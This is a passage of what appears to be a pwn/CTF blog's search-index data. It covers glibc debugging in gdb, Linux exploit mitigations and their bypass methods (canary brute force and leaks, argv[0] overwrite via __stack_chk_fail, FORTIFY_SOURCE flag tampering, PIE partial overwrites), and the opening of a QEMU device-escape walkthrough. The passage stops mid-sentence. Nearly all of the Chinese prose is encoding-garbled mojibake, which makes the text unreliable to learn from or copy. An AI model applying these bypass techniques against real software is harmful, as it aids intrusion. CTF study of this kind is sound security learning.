çº§åˆ«è°ƒè¯•ï¼š\n\nâ–²æœ‰æ—¶å€™ç”¨Patchelfåˆ‡æ¢ä¹‹åï¼Œæƒ³è°ƒè¯•å¯¹åº”ç‰ˆæœ¬çš„glibcæºç \n\n1.gdbæ‰“å¼€åç›´æ¥å‘½ä»¤è¾“å…¥æŒ‡å®šï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\n2.gdbç¯å¢ƒé…ç½®è¾“å…¥ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\nvim ~/.gdbinit\ndir /home/hacker/glibc-src/glibc-2.23/malloc\n```\n\nä½†æ˜¯è¿™æœ‰ä¸ªé—®é¢˜ï¼Œå¦‚æœéœ€è¦å¯¹åº”ç‰ˆæœ¬åˆ™æ²¡åŠæ³•ï¼Œåªä¼šåŠ è½½åˆ°æœ€ä¸‹é¢çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸€èˆ¬patchelfä¹‹åï¼ŒæŒ‡å®šdirå³å¯ã€‚\n\n \n\n \n\n","tags":["libc"],"categories":["PWN"]},{"title":"pwnä¿æŠ¤æªæ–½","url":"/2021/08/14/pwnä¿æŠ¤æªæ–½/","content":"\nä¸€ã€RELRO: (ReLocation Read-Only)\n\n1.åŠŸèƒ½ï¼šè§£å†³å»¶è¿Ÿç»‘å®šé—®é¢˜ï¼Œå°†ç¬¦å·é‡å®šå‘è¡¨è®¾ç½®ä¸ºåªè¯»ï¼Œæˆ–è€…åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œé˜²æ­¢gotè¡¨è¢«ç¯¡æ”¹ã€‚\n\n2.è¡¨ç°å½¢å¼ï¼š\n\npwn checksecæ£€æŸ¥ä¸ºRELRO: Full RELROï¼ŒPartial RELROä¿æŠ¤\n\n3.ä¿æŠ¤ç­‰çº§ï¼š\n\n(1)Partial RELRO:\n\nâ‘ ä¸€äº›æ®µ(.dynamicã€.gotç­‰)åœ¨åˆå§‹åŒ–åä¼šè¢«æ ‡è®°åªè¯»ï¼Œ.gotæ®µä»£è¡¨æ— pltæŒ‡å‘çš„gotè¡¨ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å‘ç”Ÿå»¶è¿Ÿç»‘å®šï¼Œæ²¡æœ‰è¢«å¤–éƒ¨externå¯¼å…¥çš„å‡½æ•°è¢«æ ‡è®°ä¸ºåªè¯»ã€‚\n\nâ‘¡ä½†æ˜¯æœ‰è¢«å¤–éƒ¨externå¯¼å…¥çš„å‡½æ•°ï¼Œå‘ç”Ÿå»¶è¿Ÿç»‘å®šçš„å‡½æ•°ï¼Œåœ¨.got.pltæ®µï¼Œä»ç„¶å¯ä»¥ç¯¡æ”¹gotè¡¨ï¼Œè¿™é‡Œçš„gotè¡¨æ˜¯.got.pltæ®µã€‚\n\n(2)Full RELRO:ç›´æ¥ç¦æ­¢å»¶è¿Ÿç»‘å®šï¼Œæ— .got.pltæ®µï¼Œåªæœ‰.gotæ®µï¼Œä¸”è¢«æ ‡è®°ä¸ºåªè¯»ï¼Œæ— æ³•ä¿®æ”¹ï¼Œæ— æ³•ç¯¡æ”¹gotè¡¨ã€‚\n\n4.ç»•è¿‡æ–¹æ³•ï¼šæœ‰å•¥ç»•è¿‡æ–¹æ³•ï¼Œä¸æ”¹gotè¡¨ä¸å°±å®Œäº†ã€‚\n\n \n\n \n\näºŒã€FORTIFY_SOURCE:\n\n1.åŠŸèƒ½ï¼šå°†æ•æ„Ÿå‡½æ•°å¦‚read, fgets, memcpy, printfç­‰ç­‰æ·»åŠ ä¿æŠ¤ï¼Œæ›¿æ¢ä¸º__read_chk, __fgets_chk, __memcpy_chk, __printf_chkç­‰å‡½æ•°ã€‚è¿™äº›å¸¦äº†chkçš„å‡½æ•°ä¼šæ£€æŸ¥è¯»å–/å¤åˆ¶çš„å­—èŠ‚é•¿åº¦æ˜¯å¦è¶…è¿‡ç¼“å†²åŒºé•¿åº¦ï¼Œæ£€æŸ¥è¯¸å¦‚%nä¹‹ç±»çš„å­—ç¬¦ä¸²ä½ç½®æ˜¯å¦ä½äºå¯èƒ½è¢«ç”¨æˆ·ä¿®æ”¹çš„å¯å†™åœ°å€ï¼Œé¿å…äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å‡ºç°ã€‚ï¼ˆå¦‚ç›´æ¥%7$xï¼‰\n\n2.è¡¨ç°å½¢å¼ï¼šå¸¦æœ‰chkçš„å‡½æ•°ï¼Œchecksecå¯ä»¥æ£€æµ‹åˆ°\n\n3.ä¿æŠ¤ç­‰çº§ï¼š\n\n(1)-Ol -D_FORTIFY_SOURCE=0ï¼šå…³é—­\n\n(2)-Ol -D_FORTIFY_SOURCE=1ï¼šæ›¿æ¢getï¼Œmemecpyç­‰ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»ç„¶å¯ç”¨\n\n(3)-Ol -D_FORTIFY_SOURCE=2ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿå—åˆ°é™åˆ¶ï¼š\n\n%nï¼Œ%3$xä¸å¯ç”¨(è·³è¿‡äº†1ï¼Œ2ä¸å¯ç”¨)\n\n%n$åªèƒ½ä»1å¼€å§‹æ‰å¯ä»¥ï¼š%1$x%2$xå¯ç”¨\n\n4.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨æ•´æ•°æº¢å‡ºæ¼æ´ï¼Œç¯¡æ”¹_IO_FILEç»“æ„ä¸­çš„_IO_FLAGS2_FORTIFYä¸º0ï¼Œä»è€Œå…³é—­FORTIFY_SOURCEå¯¹%nçš„æ£€æŸ¥ã€‚ä¹‹åå†åˆ©ç”¨ä»»æ„åœ°å€å†™ï¼Œå°†nargsç¯¡æ”¹ä¸º0ï¼Œä»è€Œå…³é—­å¯¹%n$çš„æ£€æŸ¥ã€‚\n\nå…·ä½“è®ºæ–‡ï¼š\n\n[http://phrack.org/issues/67/9.html](http://phrack.org/issues/67/9.html(è¦æŒ‚)\n\nhttps://jackgrence.github.io/phrack-67-9/\n\nhttps://www.vnsecurity.net/research/2012/02/16/exploiting-sudo-format-string-vunerability.html\n\néƒ½å¾—æŒ‚vpnæ‰èƒ½çœ‹\n\n \n\n \n\n \n\nä¸‰ã€NX:NX enabled (No execute bit)\n\n1.åŠŸèƒ½ï¼šå°†å†…å­˜é¡µä»¥æ•°æ®å’ŒæŒ‡ä»¤ä¸¤ç§æ–¹å¼è¿›è¡Œäº†åˆ†ç±»ã€‚è¢«æ ‡è®°ä¸ºæ•°æ®é¡µçš„å†…å­˜é¡µï¼ˆå¦‚æ ˆå’Œå †ï¼‰ä¸Šçš„æ•°æ®æ— æ³•è¢«å½“æˆæŒ‡ä»¤æ‰§è¡Œï¼Œå³æ²¡æœ‰Xå±æ€§ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´shellcodeå¤±æ•ˆã€‚é™¤äº†.textä¹‹å¤–ï¼Œå…¶ä½™æ®µï¼Œæ•°æ®(stackã€heapç­‰)éƒ½ä¸å¯æ‰§è¡Œã€‚\n\n2.è¡¨ç°å½¢å¼ï¼špwn checksecæ£€æŸ¥\n\n3.ç»•è¿‡æ–¹æ³•ï¼šROPã€Onegadgetã€ret2libcç­‰ç­‰\n\n \n\n \n\n \n\nå››ã€ASLR(Address Space Layout Randomization)å’ŒPIE(Position Independent Executable)\n\n1.åŠŸèƒ½ï¼šè¯¥æŠ€æœ¯æ˜¯ä¸€ä¸ªé’ˆå¯¹å †ã€æ ˆã€libcåœ°å€ã€ä»£ç æ®µï¼ˆ.textï¼‰ã€æ•°æ®æ®µï¼ˆ.dataï¼‰ã€æœªåˆå§‹åŒ–å…¨å±€å˜é‡æ®µï¼ˆ.bssï¼‰ç­‰å›ºå®šåœ°å€çš„ä¸€ä¸ªé˜²æŠ¤æŠ€æœ¯ï¼Œæ¯æ¬¡åŠ è½½ç¨‹åºéƒ½ä¼šéšæœºåŒ–è¿™äº›åœ°å€ã€‚\n\n2.è¡¨ç°å½¢å¼ï¼šchecksecæ£€æŸ¥ï¼Œgdb-pedaä¸­è¾“å…¥aslrã€‚\n\n3.ä¸åŒï¼š\n\n(1)ASLRæ˜¯ç³»ç»Ÿå±‚é¢çš„åœ°å€éšæœºï¼Œé’ˆå¯¹æ ˆ(stack)ï¼ŒlibcåŠ è½½åœ°å€ï¼Œå †(heap)ï¼Œæ²¡åŠæ³•åœ¨ç¼–è¯‘æ—¶é€‰æ‹©æ˜¯å¦å¼€å¯ASLRï¼Œä¸åŒç³»ç»Ÿè®¾ç½®ä¸‹éƒ½ä¸ä¸€æ ·ï¼Œåªæœ‰åœ¨ç¨‹åºè·‘èµ·æ¥ï¼Œè¿œç¨‹è°ƒè¯•æ‰èƒ½çœ‹åˆ°éšæœºåŒ–ã€‚å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥ï¼š\n\ncat /proc/sys/kernel/randomize_va_space\n\næŸ¥çœ‹å½“å‰ç³»ç»Ÿçš„éšæœºåŒ–ç­‰çº§ï¼Œä¹Ÿå¯ä»¥æ‰“å¼€è¿™ä¸ªæ–‡ä»¶è¿›è¡Œä¿®æ”¹ç­‰çº§ã€‚å…±åˆ†ä¸º3ä¸ªç­‰çº§ï¼š\n\nA.0ï¼šå³å…³é—­ASLR\n\nB.1ï¼šéƒ¨åˆ†å¼€å¯ï¼ŒéšæœºåŒ–stackå’ŒlibcåŠ è½½åœ°å€ï¼Œä¸éšæœºåŒ–heap\n\nC.2ï¼šå®Œå…¨å¼€å¯ï¼ŒéšæœºåŒ–stackã€libcåŠ è½½åœ°å€ã€heap\n\nâ–²æ³¨ï¼š\n\nç”±äºæ˜¯ç³»ç»Ÿå±‚é¢çš„ï¼Œåšpwné¢˜æ—¶è‚¯å®šæ˜¯ä¸çŸ¥é“è¿œç¨‹çš„ç³»ç»Ÿç¯å¢ƒåˆ°åº•æœ‰æ²¡æœ‰å¼€å¯ASLRï¼Œä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å¼€å¯ï¼Œä¸”éƒ½æ˜¯2ç­‰çº§ã€‚åšé¢˜åšåˆ°ç°åœ¨æ²¡è§è¿‡å“ªä¸ªé¢˜ç›®å‘Šè¯‰ä¸å¼€å¯ASLRçš„ã€‚å¦å¤–åœ¨gdb-pedaä¸­æŸ¥çœ‹aslréƒ½æ˜¯é»˜è®¤ä¸ºoffï¼Œå› ä¸ºgdbé»˜è®¤å…³é—­ASLRï¼Œå¯ä»¥åœ¨gdb-pedaä¸­è¾“å…¥aslr onæ¥æ‰“å¼€ASLRã€‚\n\n(2)PIEæ˜¯gccç¼–è¯‘åŠŸèƒ½æ—¶çš„é€‰é¡¹ï¼Œé’ˆå¯¹ä»£ç æ®µ(.text)ã€åˆå§‹åŒ–æ•°æ®æ®µ(.data)ã€æœªåˆå§‹åŒ–æ•°æ®æ®µ(.bss)çš„é˜²æŠ¤æŠ€æœ¯ã€‚å¼€å¯ä¹‹åï¼Œä»¥ä¸Šæåˆ°çš„éƒ½ä¼šéšæœºåŒ–ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿œç¨‹è°ƒè¯•è·‘èµ·æ¥æ‰èƒ½çœ‹åˆ°æ•ˆæœã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰å¼€å¯äº†ASLRä¹‹åï¼ŒPIEæ‰èƒ½è¢«æ­£å¸¸ä½¿ç”¨ã€‚\n\n4.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)åˆ©ç”¨vsyscallæˆ–è€…vdsoæ¥æ»‘è¿‡ä¸€æ®µæ ˆç©ºé—´ï¼Œä»è€Œå°†eipæŒªç§»åˆ°æ ˆåº•ä¸‹æ–¹æˆ‘ä»¬æƒ³è¦çš„åœ°å€å¤„ã€‚\n\n(2)åˆ©ç”¨æ ˆæº¢å‡ºå’Œæ‰“å°å‡½æ•°çš„å‚æ•°ï¼Œä¿®æ”¹åŠ«æŒrbpä½¿å¾—åˆ©ç”¨rbpå¯»å€çš„æ‰“å°å‡½æ•°çš„å‚æ•°æŒ‡å‘æ ˆä¸Šå…¶å®ƒä½ç½®ï¼Œé€šè¿‡çˆ†ç ´æ¥å¯»æ±‚æ³„éœ²Libcåœ°å€ã€‚\n\n(3)åˆ©ç”¨PIEæœºåˆ¶ï¼Œçˆ†ç ´å€’æ•°ç¬¬å››ä½å¯ä»¥è·³è½¬åˆ°åŒä¸€ä¸ªå†…å­˜é¡µä¸­çš„ä»»æ„å‡½æ•°ã€‚\n\n \n\n \n\n \n\näº”ã€Stack Canary/Stack cookies\n\n1.åŠŸèƒ½ï¼šå‡½æ•°é€€å‡ºæ—¶ï¼Œå°†ä¿å­˜åœ¨æ ˆrbp-0x08å¤„çš„canaryå’Œtcbhead_tç»“æ„ä½“ä¸­çš„stack_guardæ¥xoræ“ä½œï¼Œè‹¥æ£€æŸ¥åˆ°æ”¹å˜åˆ™ä»£è¡¨æ‰§è¡Œäº†æ ˆæº¢å‡ºæ¼æ´ï¼Œç¨‹åºè°ƒç”¨__stack_chk_failï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ï¼Œå¹¶å´©æºƒã€‚\n\n2.è¡¨ç°å½¢å¼ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nmov rax,fs:28h\nmov [rsp+28h+var_20], rax\n------------------------------------------------------\nmov rax, [rsp+28h+var_20]\nxor rax, fs:28h\ncall __stack_chk_fail\n------------------------------------------------------\nv_canary = __readfsqword(0x28u);\nreturn __readfsqword(0x28u) ^ v_canary;\n```\n\n3.ä¸åŒç±»å‹çš„canary:\n\n(1)Terminator canaries:\n\næœ€å¸¸è§çš„canaryï¼Œæœ«å°¾ä¸º\\x00ï¼Œä¿å­˜åœ¨rpb - 0x08çš„ä½ç½®ã€‚\n\n(2).Random canaries:\n\nåœ¨ç¨‹åºåˆå§‹åŒ–æ—¶éšæœºç”Ÿæˆï¼Œä¿å­˜åœ¨ä¸€ä¸ªç›¸å¯¹å®‰å…¨çš„ä½ç½®ã€‚é€šå¸¸ç”±/dev/urandomæ¥ç”Ÿæˆï¼Œæœ‰æ—¶ä¹Ÿä½¿ç”¨å½“å‰æ—¶é—´çš„å“ˆå¸Œå€¼ã€‚\n\n(3).Random XOR canaries:\n\né€šè¿‡ä¸€ä¸ªéšæœºæ•°å’Œå‡½æ•°æ ˆä¸­æ‰€æœ‰æ§åˆ¶ä¿¡æ¯ï¼Œè¿”å›åœ°å€ç­‰å¼‚æˆ–è¿ç®—å¾—åˆ°çš„ï¼Œè¿™æ ·å½“å‡½æ•°æ ˆä¸­çš„éšæœºæ•°æˆ–ä¸ä¹‹ç›¸å…³çš„æ§åˆ¶ä¿¡æ¯ï¼Œè¿”å›åœ°å€è¢«ä¿®æ”¹äº†ï¼Œéƒ½å¯ä»¥æ£€æµ‹åˆ°ã€‚\n\n2.ç»•è¿‡æ–¹æ³•ï¼š\n\n(1)æœ‰å¾ªç¯æ—¶ï¼Œ32æˆ–è€…64ä½ç¨‹åºä¸‹éƒ½å¯ä»¥é€å­—èŠ‚çˆ†ç ´ç»•è¿‡ã€‚\n\n(2)å¯é€šè¿‡printfå­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²(%p.%p.%p....)ã€‚\n\n(3)é€šè¿‡æ‰“å°æ ˆä¸Šæ•°æ®çš„æ‰“å°å‡½æ•°æ ˆæº¢å‡ºè¿ä¸Šcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n(4)å½“ç¨‹åºè¯»å…¥flagè¿›å…¥å†…å­˜æ—¶ï¼Œåˆ©ç”¨å‡½æ•°__stack_chk_failï¼ŒåŠ ä¸Šè¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºç¨‹åºä¸­ä¿å­˜flagçš„åœ°å€ã€‚è¿™æ ·å½“__stack_chk_failè¿è¡Œæ—¶å°±ä¼šæ‰“å°å‡ºargv[0]ä¸­åœ°å€ä¸Šå¯¹åº”çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚\n\n(5)ç”±pthreadåˆ›å»ºå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°ä¸­å¦‚æœæœ‰è¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥ç›´æ¥è¦†ç›–canaryæ¥æºtcbhead_tç»“æ„ä½“ä¸­çš„canaryå’Œæ ˆä¸­çš„canaryä¸ºåŒä¸€æ•°å€¼ï¼Œè¿™æ ·æ£€æŸ¥ä»æ—§é€šè¿‡ã€‚\n\n(64ä½ä¸­ä¸ºfs:[28h]ï¼Œ32ä½ä¸­ä¸ºgs:[14h])\n\nâ–²é•¿åº¦ä¸€èˆ¬ä¸ºrbp+2000å·¦å³ï¼Œä¸åŒçš„Libcç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ã€‚åŸå› æ˜¯é€šè¿‡pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°æ ˆä¼šè¢«å®‰ç½®åˆ°ä¸TLSç›¸å·®çº¦2000å­—èŠ‚çš„è·ç¦»å¤„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519177.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191519553.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªæ˜¯mainå‡½æ•°æ ˆï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨mainå‡½æ•°ä¸­é€šè¿‡pthreadè¿›ç¨‹åˆ›å»ºå¹¶ä¸”è°ƒç”¨çš„å‡½æ•°æ ˆï¼Œä¸¤è€…ç›¸å·®å°†è¿‘0x700000000è¿™ä¹ˆè¿œï¼Œå®Œå…¨ä¸æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ç›¸å·®çš„æ ˆè·ç¦»ã€‚åŒæ—¶åœ¨è¯¥å‡½æ•°ä¸­rbpæŒ‡å‘çš„å§‹ç»ˆæ˜¯0000(å…¨æ˜¯)ï¼Œè¯¥å‡½æ•°ç»“æŸåä¼šå…ˆè·³è½¬åˆ°libcä¸­çš„libpthreadæ¥æ¢å¤æ ˆã€‚\n\nâ–²64ä½çš„tcbhead_tç»“æ„ä½“ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//å³ä¸ºcanaryï¼Œfs:28hå¤„\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","pwn-Knowledge"]},{"title":"qemué€ƒé€¸-pwnè§£é¢˜","url":"/2021/08/14/qemué€ƒé€¸-pwnè§£é¢˜/","content":"\nä¸€ã€å†…å­˜æ¨¡å—ï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507619.jpeg)\n\n1.å¯ä»¥çœ‹åˆ°åœ¨å®é™…ç‰©ç†å†…å­˜physical memoryä¸­å­˜åœ¨qemuè¿›ç¨‹çš„å†…å­˜ç©ºé—´\n\n2.ä¹‹ååœ¨qemuè¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­è™šæ‹ŸåŒ–å‡ºè™šæ‹Ÿä¸»æœºçš„å®é™…å†…å­˜ç©ºé—´Guest's phy memoryã€‚\n\n3.ç„¶åæ‰æ˜¯è™šæ‹Ÿä¸»æœºä¸­å„ä¸ªè¿›ç¨‹çš„å†…å­˜åˆ†é…ã€‚\n\nâ–²è¿™é‡Œå¯ä»¥çœ‹åˆ°è™šæ‹Ÿæœºä¸­çš„è¿›ç¨‹åœ°å€éƒ½åœ¨å®é™…å†…å­˜åœ°å€ä¸­æœ‰æ˜ å°„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°åœ¨è™šæ‹Ÿä¸»æœºä¸­çš„æŸä¸ªè¿›ç¨‹å¯¹åº”çš„å®é™…å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆä¸€æ—¦æ»¡è¶³ä¸€å®šæƒé™è¦æ±‚å°±å¯ä»¥æ‰§è¡Œå®é™…å†…å­˜ä¸­qemuè¿›ç¨‹åŠ è½½çš„libcä¸­çš„å†…å®¹ï¼Œä»è€Œè°ƒç”¨å®é™…å†…å­˜ä¸­çš„systemå‘½ä»¤ï¼Œå®ç°qemué€ƒé€¸ã€‚\n\n \n\näºŒã€é€ƒé€¸çªç ´å£ï¼š\n\nâ–²qemué€ƒé€¸ä¸€èˆ¬æ˜¯ä»qemuè™šæ‹ŸåŒ–è®¾å¤‡çš„ä»£ç ä¸­å¯»æ‰¾æ¼æ´ï¼Œä½†æ˜¯qemuä¼šè™šæ‹ŸåŒ–å¾ˆå¤šè®¾å¤‡ï¼Œåœ¨ctfä¸­ä¸€èˆ¬éœ€è¦å…³æ³¨çš„å°±æ˜¯é¢˜ç›®ç»™çš„PCIè®¾å¤‡ã€‚åŸºæœ¬ä¸Šéƒ½æ˜¯æŠŠqemu-system-x86ç”¨IDAæ‰“å¼€ï¼Œç„¶åä»å’Œè¯¥è®¾å¤‡äº¤äº’çš„å‡½æ•°ä¸­å¯»æ‰¾æ¼æ´ã€‚\n\nä¾‹å¦‚åˆ†æé¢˜ç›®åçŸ¥é“äº†æŸä¸ªè®¾å¤‡å¯èƒ½å°±æ˜¯æ¼æ´è®¾å¤‡ï¼Œè¿™é‡Œä»¥BlizzardCTF2017-Strngé¢˜ç›®ä¸ºä¾‹ï¼ŒåŠ è½½äº†strngè®¾å¤‡ï¼Œé‚£ä¹ˆå°±ç”¨IDAæ‰“å¼€qemu-system-x86ï¼Œç„¶ååœ¨å‡½æ•°åˆ—è¡¨æœç´¢strngï¼Œæ‰¾åˆ°å¯¹åº”å‡½æ•°è¿›è¡Œåˆ†æã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507124.png)\n\nå¯»æ‰¾æ¼æ´å°±éœ€è¦æ›´å¤šçš„å‰ç½®çŸ¥è¯†äº†ï¼š\n\n1.å¯»æ‰¾åˆ°è®¾å¤‡çš„ä»£å·ï¼Œæ–¹ä¾¿æŸ¥çœ‹å…¶è®¾å¤‡åœ°å€ç©ºé—´ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nubuntu@ubuntu:~$ lspci\n00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)\n00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]\n00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]\n00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)\n00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)\n00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)\n00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)\n```\n\n \n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)ï¼Œä¸€èˆ¬æ ‡è®°ä¸ºunclassified deviceå°±æ˜¯qemuå¯åŠ¨æ—¶çš„å‘½ä»¤å‚æ•°ä¸­åŠ è½½è¿›å…¥çš„è®¾å¤‡ï¼Œä¹Ÿå°±æ˜¯strngè®¾å¤‡ã€‚é‚£ä¹ˆå…¶å¯¹åº”çš„ä»£å·å°±æ˜¯00:03.0ï¼Œä¹‹åé€šè¿‡è¿™ä¸ªä»£å·æŸ¥è¯¢æ›´å¤šå†…å®¹ã€‚\n\n2.æŸ¥çœ‹PCIè®¾å¤‡çš„åœ°å€ç©ºé—´ï¼Œä»è€Œæ–¹ä¾¿æ¨æ–­å‡ºè®¾å¤‡å®é™…ç”³è¯·çš„å†…å­˜åœ°å€ï¼š\n\n(1)é€šè¿‡è®¾å¤‡ä»£å·ï¼Œæ‰¾åˆ°è¯¥è®¾å¤‡çš„åœ°å€ç©ºé—´ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nlspci -v -m -n -s 00:03.0\n-------------------------------------------------------------------------\nlspci -v -m -s 00:03.0\n-----------------------------------------------------------------------\nlspci -v -s 00:03.0 -x\n------------------------------------------------------------------------\nhexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n```\n\n(2)é€šè¿‡åœ°å€ç©ºé—´æ‰¾åˆ°è¯¥è®¾å¤‡ç”³è¯·çš„å†…å­˜ç©ºé—´ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507195.png)\n\n```\n#æ³¨é‡Šå¤´\n\nubuntu@ubuntu:~$ hexdump /sys/devices/pci0000\\:00/0000\\:00\\:03.0/config\n0000000 1234 11e9 0103 0000 0010 00ff 0000 0000\n0000010 1000 febf c051 0000 0000 0000 0000 0000\n0000020 0000 0000 0000 0000 0000 0000 1af4 1100\n0000030 0000 0000 0000 0000 0000 0000 0000 0000\n```\n\n \n\nè¿™é‡Œé€šè¿‡å¯¹ç…§ï¼Œå¯ä»¥çŸ¥é“ä»¥ä¸Šå„ä¸ªå‚æ•°çš„å®é™…å†…å®¹ã€‚\n\n(3)ç„¶åå¯»æ‰¾mmioå’Œpmioçš„åœ°å€ï¼Œè¿™ä¸¤ä¸ªæ˜¯PCIè®¾å¤‡ä¸ºäº†ä¸qemuè™šæ‹Ÿæœºè¿›è¡ŒI/Oç”³è¯·æ‰€æ˜ å°„çš„ä¸¤å—å†…å­˜ã€‚ç”±äºqemuæ¨¡æ‹Ÿè®¾å¤‡æœ€ç»ˆéƒ½ä¼šä¸çœŸå®çš„è®¾å¤‡è¿›è¡Œäº¤äº’ï¼Œè€Œqemuä¸­çš„mmioå°±æ˜¯ç›¸å¯¹äºä¸»æœºä¸‹çš„mmioçš„ä¸€æ®µæ˜ å°„ï¼Œæ‰€ä»¥è®¿é—®è¿™æ®µç©ºé—´å°±ç›¸å½“äºè®¿é—®ä¸»æœºä¸‹çš„mmioç©ºé—´ï¼Œé‚£ä¹ˆå°±èƒ½è·³å‡ºqemuï¼Œå®ç°qemué€ƒé€¸ã€‚è€ŒPCIè®¾å¤‡çš„å¤§å¤šçš„è¯»å†™æ“ä½œéƒ½åœ¨è¿™ä¸¤å—å†…å­˜ä¸Šï¼Œæ‰€ä»¥é’ˆå¯¹è¿™ä¸¤å—å†…å­˜çš„æ“ä½œå‡½æ•°é€šå¸¸ä¹Ÿæ˜¯æœ€å®¹æ˜“å‡ºç°æ¼æ´çš„åœ°æ–¹ã€‚\n\nâ‘ mmio:ä¸å†…å­˜å…±äº«ä¸€å—åœ°å€ç©ºé—´ï¼Œå…±ç”¨ä¸€å®šæ•°é‡çš„åœ°å€æ€»çº¿ï¼Œcpuå¯¹è¯¥åœ°å€ç©ºé—´çš„è®¿é—®ä¼šç›´æ¥è½¬åŒ–ä¸ºå¯¹è®¾å¤‡çš„è®¿é—®ã€‚\n\nâ‘¡pmio:ä¸å†…å­˜åˆ†å¼€çš„ï¼Œæ‰€ç”¨çš„åœ°å€æ€»çº¿å’Œå†…å­˜æ‰€ç”¨çš„åœ°å€æ€»çº¿ä¸æ˜¯ä¸€æ ·çš„ï¼Œcpuè®¿é—®è¿™å—å†…å­˜æ—¶éœ€è¦ä½¿ç”¨ç‰¹æ®Šçš„æŒ‡ä»¤è¿›è¡Œè®¿é—®ã€‚\n\nè¿™ä¸¤å—å†…å­˜æ˜¯åœ¨BAR(base address register)ä¸­ï¼ŒBARæ€»å…±6ä¸ªregisterï¼ŒBAR0ï¼ŒBAR1...ï¼Œæ¯ä¸ªBARå æ®4ä¸ªå­—èŠ‚ã€‚è€Œmmioå¯¹åº”BAR0ï¼Œpmioå¯¹åº”BAR1ã€‚\n\nâ–²ç»“åˆä¸Šå›¾å¯ä»¥çœ‹åˆ°mmioçš„åœ°å€ä¸º0xfebf1000ï¼Œpmioåœ°å€ä¸º0xc051ã€‚\n\n3.æŸ¥çœ‹PCIè®¾å¤‡åˆå§‹åŒ–çš„å‡½æ•°ï¼Œå¯»æ‰¾æ¼æ´ï¼š\n\n(1)é¦–å…ˆæŸ¥çœ‹æ³¨å†Œstrngè®¾å¤‡çš„å‡½æ•°ï¼šè¿™é‡Œåˆ†æå¯ä»¥çŸ¥é“strng_class_initå³ä¸ºåˆå§‹åŒ–å‡½æ•°ï¼š\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191507927.jpeg)\n\nobject_class_dynamic_cast_assertå‡½æ•°å³åˆ›å»ºäº†ä¸€ä¸ªè®¾å¤‡ï¼Œåé¢çš„ä¸€äº›æ“ä½œéƒ½æ˜¯èµ‹å€¼è¯­å¥ï¼Œä¸ºäº†åˆå§‹åŒ–è¯¥è®¾å¤‡ã€‚\n\n(2)ç„¶åæŸ¥çœ‹strng_instance_initå‡½æ•°ï¼Œè¯¥å‡½æ•°æ˜¯ä¸ºäº†å®ä¾‹åŒ–è®¾å¤‡ï¼Œåˆå§‹åŒ–è®¾å¤‡çš„ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„